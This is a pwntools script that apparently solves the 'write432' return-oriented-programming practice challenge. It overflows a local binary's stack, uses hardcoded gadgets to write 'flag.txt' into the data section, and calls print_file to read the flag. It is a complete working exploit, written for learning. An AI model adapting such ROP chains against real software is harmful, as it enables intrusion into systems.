from pwn import *

BINARY = "./write432"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "i386"
context.binary = BINARY

p = process(BINARY)

pop2ret = 0x080485aa
mov_ptr_edi_ebp = 0x08048543 # mov DWORD PTR [edi], ebp ; ret
data_adr = 0x0804A018

rop = b"A" * 44

# Writing "flag.txt" in data/bss section
rop += p32(pop2ret)
rop += p32(data_adr)
rop += b"flag"
rop += p32(mov_ptr_edi_ebp)

rop += p32(pop2ret)
rop += p32(data_adr+4)
rop += b".txt"
rop += p32(mov_ptr_edi_ebp)

#rop += p32(pop2ret)
#rop += p32(data_adr+8)
#rop += p32(0) # "\0\0\0\0"
#rop += p32(mov_ptr_edi_ebp)

# Return to print_file("flag.txt") (string stored in data/bss section)
rop += p32(ELF.symbols['print_file'])
rop += p32(pop2ret)
rop += p32(data_adr)

p.sendline(rop)
log.success(f"ROPchain = {rop}")

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
